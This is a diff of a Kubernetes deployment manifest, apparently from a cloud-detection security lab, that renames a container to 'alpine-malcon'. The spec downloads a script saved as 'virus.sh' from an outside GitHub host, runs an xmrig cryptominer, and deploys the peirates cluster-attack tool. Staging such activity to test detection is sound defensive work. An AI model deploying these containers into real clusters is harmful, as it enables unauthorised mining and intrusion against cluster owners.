@@ -16,12 +16,11 @@ spec:
     spec:
       restartPolicy: Always
       containers:
-        - name: alpine
+        - name: alpine-malcon
           image: alpine:latest
           command: ["/bin/sh", "-c"]
           args:
             - "wget -q https://raw.githubusercontent.com/hankthebldr/xsiam-prisma-cdr-lab/refs/heads/alpha/1.0/malicous-container/malicous-container.sh -O virus.sh && sleep 3600"
-
         - name: xmrig
           image: metal3d/xmrig:latest
           args:
@@ -29,7 +28,6 @@ spec:
             - "--user=NOKEY"
             - "--pass=x"
           # Additional arguments can be added here if required
-
         - name: peirates
           image: bustakube/alpine-peirates:latest
           command: ["/bin/sh", "-c"]
